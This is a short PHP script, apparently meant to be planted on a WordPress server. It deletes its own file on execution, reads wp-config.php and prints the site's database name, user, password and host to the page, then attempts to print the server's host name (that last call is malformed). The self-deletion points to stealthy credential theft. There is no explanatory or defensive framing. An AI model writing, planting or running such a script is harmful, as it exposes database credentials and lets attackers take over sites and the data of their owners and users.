<?php

unlink(__FILE__);

require_once($_SERVER['DOCUMENT_ROOT'] . '/wp-config.php');

echo('DB_NAME: '.DB_NAME.'<br>');
echo('DB_USER: '.DB_USER.'<br>');
echo('DB_PASSWORD: '.DB_PASSWORD.'<br>');
echo('DB_HOST: '.DB_HOST.'<br>');

echo ('SERVER IP: '.gethostbyaddr());

exit();